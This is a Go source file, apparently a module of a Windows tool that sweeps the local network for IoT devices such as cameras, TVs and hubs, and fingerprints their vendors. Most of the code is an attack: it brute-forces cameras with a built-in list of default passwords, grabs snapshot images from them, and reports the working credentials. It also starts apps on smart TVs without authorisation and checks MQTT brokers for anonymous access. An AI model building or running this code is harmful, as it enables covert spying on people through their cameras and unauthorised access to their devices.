//go:build windows

package main

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// device model
// ---------------------------------------------------------------------------

type Device struct {
	Host      string   `json:"host"`
	Kind      string   `json:"kind"`      // camera, tv, hub, printer, nas, unknown
	Vendor    string   `json:"vendor"`
	Model     string   `json:"model"`
	Ports     []int    `json:"ports"`
	Endpoints []string `json:"endpoints"`
	Auth      string   `json:"auth"`      // none, basic, digest, unknown
	NeedsAuth bool     `json:"needsAuth"`
}

// Ports that identify IoT classes.
var iotPorts = map[int]string{
	554:   "rtsp",
	8554:  "rtsp-alt",
	8000:  "hikvision",
	37777: "dahua",
	34567: "xiongmai",
	80:    "http",
	8080:  "http-alt",
	443:   "https",
	8008:  "cast",
	8009:  "cast",
	5000:  "upnp/plugin",
	1900:  "ssdp",
	9100:  "printer",
	515:   "lpd",
	631:   "ipp",
	1883:  "mqtt",
	6668:  "tuya",
	9999:  "tp-link-kasa",
	8081:  "http-alt2",
}

// defaultCreds is the short list that matters for consumer cameras.
var iotCreds = [][2]string{
	{"admin", "admin"},
	{"admin", ""},
	{"admin", "12345"},
	{"admin", "password"},
	{"admin", "123456"},
	{"root", "root"},
	{"root", "pass"},
	{"admin", "admin123"},
	{"service", "service"},
	{"supervisor", "supervisor"},
}

func scanIoT(s Settings) {
	targets := s.Targets
	if len(targets) == 0 {
		targets = arpTargets()
	}
	max := s.MaxDevices
	if max <= 0 {
		max = 256
	}
	if len(targets) > max {
		targets = targets[:max]
	}

	sendEvent("status", map[string]interface{}{
		"state": "scanning",
		"detail": fmt.Sprintf("probing %d host(s) for iot devices", len(targets)),
	})

	var mu sync.Mutex
	var found []Device
	var wg sync.WaitGroup
	sem := make(chan struct{}, 48)

	for _, t := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if d, ok := probeDevice(t); ok {
				mu.Lock()
				found = append(found, d)
				mu.Unlock()
				sendEvent("device", d)
				sendEvent("progress", map[string]interface{}{"found": len(found)})
			}
		}(t)
	}
	wg.Wait()

	sort.Slice(found, func(a, b int) bool { return found[a].Host < found[b].Host })
	sendEvent("devices", found)
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("found %d iot device(s)", len(found)),
	})
}

func probeDevice(host string) (Device, bool) {
	d := Device{Host: host}
	var open []int
	var mu sync.Mutex
	var wg sync.WaitGroup

	for p := range iotPorts {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(p)), 500*time.Millisecond)
			if err == nil {
				_ = c.Close()
				mu.Lock()
				open = append(open, p)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()

	if len(open) == 0 {
		return d, false
	}
	sort.Ints(open)
	d.Ports = open
	d.Kind, d.Vendor = classifyDevice(open)

	// Pull a banner from the most informative web port.
	for _, p := range open {
		if p != 80 && p != 8080 && p != 443 && p != 8000 && p != 8081 {
			continue
		}
		scheme := "http"
		if p == 443 {
			scheme = "https"
		}
		url := fmt.Sprintf("%s://%s:%d/", scheme, host, p)
		client := httpClient()
		req, _ := http.NewRequest("GET", url, nil)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
		_ = resp.Body.Close()

		if resp.StatusCode == 401 {
			d.NeedsAuth = true
			d.Auth = "basic"
			if strings.Contains(strings.ToLower(resp.Header.Get("WWW-Authenticate")), "digest") {
				d.Auth = "digest"
			}
		}
		server := resp.Header.Get("Server")
		body := string(raw)

		// Vendor fingerprints from headers, titles and known paths.
		if v, m := fingerprint(server, body, host, p, client); v != "" {
			d.Vendor = v
			if m != "" {
				d.Model = m
			}
		}
		d.Endpoints = append(d.Endpoints, url)
		break
	}

	// RTSP presence is the strongest camera signal.
	for _, p := range open {
		if p == 554 || p == 8554 {
			d.Kind = "camera"
		}
	}
	return d, true
}

func classifyDevice(ports []int) (string, string) {
	has := func(p int) bool {
		for _, x := range ports {
			if x == p {
				return true
			}
		}
		return false
	}
	switch {
	case has(554) || has(8554) || has(37777) || has(34567):
		return "camera", ""
	case has(8008) || has(8009):
		return "tv", "chromecast"
	case has(9100) || has(515) || has(631):
		return "printer", ""
	case has(1883) || has(6668) || has(9999):
		return "hub", ""
	case has(8000):
		return "camera", "hikvision"
	case has(8081):
		return "hub", ""
	}
	return "unknown", ""
}

var (
	titleTag = regexp.MustCompile(`(?i)<title[^>]*>([^<]{1,120})</title>`)
	modelRe  = regexp.MustCompile(`(?i)(DS-2[A-Z0-9]{4,}|IPC[A-Z0-9-]{3,}|DCS-[0-9]{4,}|RLC-[0-9]{2,}|C[0-9]{2}[A-Z]{2})`)
)

func fingerprint(server, body, host string, port int, client *http.Client) (string, string) {
	low := strings.ToLower(server + " " + body)

	vendors := []struct{ marker, name string }{
		{"hikvision", "Hikvision"},
		{"dvrdvs", "Hikvision"},
		{"dahua", "Dahua"},
		{"xiongmai", "Xiongmai"},
		{"xm030", "Xiongmai"},
		{"foscam", "Foscam"},
		{"reolink", "Reolink"},
		{"amcrest", "Amcrest"},
		{"axis", "Axis"},
		{"dlink", "D-Link"},
		{"netgear", "Netgear"},
		{"tplink", "TP-Link"},
		{"tp-link", "TP-Link"},
		{"tuya", "Tuya"},
		{"sonoff", "Sonoff"},
		{"espressif", "ESP-based"},
		{"nest", "Google Nest"},
		{"ring", "Ring"},
		{"wyze", "Wyze"},
	}
	vendor := ""
	for _, v := range vendors {
		if strings.Contains(low, v.marker) {
			vendor = v.name
			break
		}
	}

	model := ""
	if m := modelRe.FindString(body); m != "" {
		model = m
	}
	if t := titleTag.FindStringSubmatch(body); t != nil && model == "" {
		cand := strings.TrimSpace(t[1])
		if len(cand) > 0 && len(cand) < 60 && !strings.EqualFold(cand, "index") {
			model = cand
		}
	}

	// ONVIF probe reveals the manufacturer directly.
	if vendor == "" {
		if v, m := onvifInfo(host); v != "" {
			vendor = v
			if model == "" {
				model = m
			}
		}
	}
	return vendor, model
}

// ---------------------------------------------------------------------------
// ONVIF
// ---------------------------------------------------------------------------

// onvifInfo queries the device service for manufacturer/model. Many cameras
// answer this unauthenticated.
func onvifInfo(host string) (string, string) {
	body := `<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
<s:Body xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
<tds:GetDeviceInformation/>
</s:Body></s:Envelope>`

	for _, path := range []string{"/onvif/device_service", "/onvif/services", "/onvif/device"} {
		for _, scheme := range []string{"http", "https"} {
			url := fmt.Sprintf("%s://%s%s", scheme, host, path)
			if info, ok := soapProbe(url, body); ok {
				return extractTag(info, "Manufacturer"), extractTag(info, "Model")
			}
		}
	}
	return "", ""
}

func soapProbe(url, body string) (string, bool) {
	client := httpClient()
	req, _ := http.NewRequest("POST", url, strings.NewReader(body))
	req.Header.Set("Content-Type", `application/soap+xml; charset=utf-8`)
	resp, err := client.Do(req)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return "", false
	}
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	out := string(raw)
	if !strings.Contains(out, "Manufacturer") && !strings.Contains(out, "Model") {
		return "", false
	}
	return out, true
}

func extractTag(xml, tag string) string {
	re := regexp.MustCompile(`(?is)<[^>]*` + tag + `[^>]*>([^<]+)<`)
	if m := re.FindStringSubmatch(xml); m != nil {
		return strings.TrimSpace(m[1])
	}
	return ""
}

// ---------------------------------------------------------------------------
// snapshots
// ---------------------------------------------------------------------------

// snapshotPaths are the snapshot endpoints used across common camera brands.
// They are tried in order; the first JPEG wins.
var snapshotPaths = []string{
	"/ISAPI/Streaming/channels/101/picture",           // Hikvision
	"/cgi-bin/snapshot.cgi",                            // Dahua / generic
	"/cgi-bin/snapshot.cgi?channel=1",
	"/snapshot.cgi",
	"/snap.jpg",
	"/tmpfs/auto.jpg",
	"/image/jpeg.cgi",
	"/onvif-http/snapshot",
	"/axis-cgi/jpg/image.cgi",                          // Axis
	"/cgi-bin/api.cgi?cmd=Snap&channel=0",              // Reolink
	"/img/snapshot.cgi",
	"/video.cgi",
	"/Streaming/channels/1/picture",
	"/jpg/image.jpg",
	"/snapshot.jpg",
}

func snapshotIoT(s Settings) {
	targets := s.Targets
	if len(targets) == 0 {
		targets = arpTargets()
	}

	users := s.Users
	passwords := s.Passwords
	if len(users) == 0 {
		for _, c := range iotCreds {
			users = append(users, c[0])
			passwords = append(passwords, c[1])
		}
	}

	sendEvent("status", map[string]interface{}{"state": "working", "detail": "grabbing camera snapshots"})

	for _, host := range targets {
		if !hasRTSP(host) {
			continue
		}
		img, path, user, pass, err := grabSnapshot(host, users, passwords)
		if err != nil || len(img) == 0 {
			sendEvent("snapshot", map[string]interface{}{
				"host": host, "ok": false, "error": errString(err),
			})
			continue
		}
		sendEvent("snapshot", map[string]interface{}{
			"host": host, "ok": true, "path": path,
			"user": user, "password": pass,
			"size": len(img),
			"data": base64.StdEncoding.EncodeToString(img),
		})
	}
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "snapshot run complete"})
}

func errString(err error) string {
	if err == nil {
		return "no jpeg returned"
	}
	return err.Error()
}

func hasRTSP(host string) bool {
	for _, p := range []int{554, 8554, 80, 8080, 8000} {
		c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(p)), 400*time.Millisecond)
		if err == nil {
			_ = c.Close()
			return true
		}
	}
	return false
}

func grabSnapshot(host string, users, passwords []string) ([]byte, string, string, string, error) {
	type cred struct{ u, p string }
	var creds []cred
	creds = append(creds, cred{"", ""}) // try unauthenticated first
	for i := range users {
		if i < len(passwords) {
			creds = append(creds, cred{users[i], passwords[i]})
		}
	}

	client := httpClient()
	for _, c := range creds {
		for _, scheme := range []string{"http", "https"} {
			for _, path := range snapshotPaths {
				url := fmt.Sprintf("%s://%s%s", scheme, host, path)
				req, _ := http.NewRequest("GET", url, nil)
				if c.u != "" {
					req.SetBasicAuth(c.u, c.p)
				}
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				raw, _ := io.ReadAll(io.LimitReader(resp.Body, 8*1024*1024))
				_ = resp.Body.Close()
				if resp.StatusCode == 200 && looksLikeJPEG(raw) {
					return raw, path, c.u, c.p, nil
				}
			}
		}
	}
	return nil, "", "", "", fmt.Errorf("no snapshot endpoint answered with a jpeg")
}

func looksLikeJPEG(b []byte) bool {
	return len(b) > 4 && b[0] == 0xFF && b[1] == 0xD8 && b[len(b)-2] == 0xFF && b[len(b)-1] == 0xD9
}

// ---------------------------------------------------------------------------
// smart TV control (DIAL / Cast)
// ---------------------------------------------------------------------------

func tvCommand(s Settings, payload []byte) {
	var cmd struct {
		Host string `json:"host"`
		App  string `json:"app"`
		Text string `json:"text"`
	}
	_ = jsonUnmarshal(payload, &cmd)
	if cmd.Host == "" {
		sendEvent("error", map[string]interface{}{"message": "no host"})
		return
	}

	// Most smart TVs expose DIAL on 8008 or 8009.
	endpoints := []string{
		"http://" + cmd.Host + ":8008/apps/YouTube",
		"http://" + cmd.Host + ":8008/apps/Netflix",
		"http://" + cmd.Host + ":8008/apps/",
	}
	for _, e := range endpoints {
		req, _ := http.NewRequest("POST", e, nil)
		resp, err := httpClient().Do(req)
		if err != nil {
			continue
		}
		loc := resp.Header.Get("Location")
		_ = resp.Body.Close()
		if resp.StatusCode < 400 || loc != "" {
			sendEvent("tv", map[string]interface{}{
				"host": cmd.Host, "ok": true, "endpoint": e, "location": loc,
			})
			return
		}
	}
	sendEvent("tv", map[string]interface{}{"host": cmd.Host, "ok": false, "error": "no DIAL endpoint responded"})
}

// ---------------------------------------------------------------------------
// smart hub dump (MQTT / Tuya)
// ---------------------------------------------------------------------------

func hubDump(s Settings) {
	targets := s.Targets
	if len(targets) == 0 {
		targets = arpTargets()
	}

	sendEvent("status", map[string]interface{}{"state": "working", "detail": "probing hubs"})

	var found []map[string]interface{}
	for _, host := range targets {
		for _, p := range []int{1883, 8883, 6668, 9999, 8081} {
			c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(p)), 600*time.Millisecond)
			if err != nil {
				continue
			}
			_ = c.Close()

			info := map[string]interface{}{"host": host, "port": p}
			switch p {
			case 1883, 8883:
				info["kind"] = "mqtt"
				// An MQTT broker that accepts an anonymous CONNECT is a wide
				// open door onto every device that publishes through it.
				if mqttAnonymous(host, p) {
					info["anonymous"] = true
				}
			case 6668:
				info["kind"] = "tuya"
			case 9999:
				info["kind"] = "kasa"
			case 8081:
				info["kind"] = "hub-http"
			}
			found = append(found, info)
			sendEvent("hub", info)
		}
	}
	sendEvent("hubs", found)
	sendEvent("status", map[string]interface{}{"state": "done", "detail": strconv.Itoa(len(found)) + " hub endpoint(s)"})
}

// mqttAnonymous sends a CONNECT with no credentials and checks for CONNACK 0.
func mqttAnonymous(host string, port int) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))

	// MQTT 3.1.1 CONNECT, protocol level 4, clean session, no client id flags.
	pkt := []byte{
		0x10, 12, // CONNECT, remaining length
		0x00, 0x04, 'M', 'Q', 'T', 'T',
		0x04,       // level 4
		0x02,       // clean session
		0x00, 0x3c, // keepalive 60
	}
	// Empty client id.
	pkt = append(pkt, 0x00, 0x00)

	if _, err := conn.Write(pkt); err != nil {
		return false
	}
	buf := make([]byte, 4)
	n, err := conn.Read(buf)
	if err != nil || n < 4 {
		return false
	}
	// CONNACK is 0x20, and the return code is the last byte (0 = accepted).
	return buf[0] == 0x20 && buf[3] == 0x00
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func arpTargets() []string {
	out, err := exec.Command("arp", "-a").Output()
	if err != nil {
		return nil
	}
	re := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
	seen := map[string]bool{}
	var list []string
	for _, line := range strings.Split(string(out), "\n") {
		ip := re.FindString(line)
		if ip == "" || seen[ip] {
			continue
		}
		if strings.HasSuffix(ip, ".255") || strings.HasSuffix(ip, ".1") {
			continue
		}
		seen[ip] = true
		list = append(list, ip)
	}
	sort.Strings(list)
	return list
}

func httpClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext:     (&net.Dialer{Timeout: 4 * time.Second}).DialContext,
	}
	return &http.Client{Transport: tr, Timeout: 8 * time.Second}
}

// ---------------------------------------------------------------------------
// RTSP / digest helpers (kept for stream pull + digest auth)
// ---------------------------------------------------------------------------

// rtspDescribe issues a DESCRIBE so we learn the stream path and whether the
// camera wants digest auth.
func rtspDescribe(host, user, pass string) (string, bool) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "554"), 3*time.Second)
	if err != nil {
		return "", false
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(4 * time.Second))

	url := "rtsp://" + host + "/"
	req := fmt.Sprintf("DESCRIBE %s RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0\r\nAccept: application/sdp\r\n", url)
	if user != "" {
		req += "Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass)) + "\r\n"
	}
	req += "\r\n"

	if _, err := conn.Write([]byte(req)); err != nil {
		return "", false
	}
	buf := make([]byte, 8192)
	n, err := conn.Read(buf)
	if err != nil && n == 0 {
		return "", false
	}
	resp := string(buf[:n])
	return resp, strings.Contains(resp, "200 OK")
}

// digestAuth builds a Digest Authorization header. Several camera families
// (Dahua, older Hikvision) only speak digest.
func digestAuth(method, uri, user, pass, challenge string) string {
	realm := regexp.MustCompile(`(?i)realm="([^"]*)"`).FindStringSubmatch(challenge)
	nonce := regexp.MustCompile(`(?i)nonce="([^"]*)"`).FindStringSubmatch(challenge)
	if realm == nil || nonce == nil {
		return ""
	}
	qop := regexp.MustCompile(`(?i)qop="?([^",]*)`).FindStringSubmatch(challenge)

	ha1 := md5.Sum([]byte(user + ":" + realm[1] + ":" + pass))
	ha2 := md5.Sum([]byte(method + ":" + uri))
	cnonce := make([]byte, 8)
	_, _ = rand.Read(cnonce)
	cn := hex.EncodeToString(cnonce)

	if qop != nil && strings.Contains(qop[1], "auth") {
		nc := "00000001"
		response := md5.Sum([]byte(
			hex.EncodeToString(ha1[:]) + ":" + nonce[1] + ":" + nc + ":" + cn + ":auth:" + hex.EncodeToString(ha2[:])))
		return fmt.Sprintf(`Digest username="%s", realm="%s", nonce="%s", uri="%s", qop=auth, nc=%s, cnonce="%s", response="%s"`,
			user, realm[1], nonce[1], uri, nc, cn, hex.EncodeToString(response[:]))
	}
	response := md5.Sum([]byte(hex.EncodeToString(ha1[:]) + ":" + nonce[1] + ":" + hex.EncodeToString(ha2[:])))
	return fmt.Sprintf(`Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"`,
		user, realm[1], nonce[1], uri, hex.EncodeToString(response[:]))
}

func jsonUnmarshal(b []byte, v interface{}) error {
	return json.Unmarshal(b, v)
}
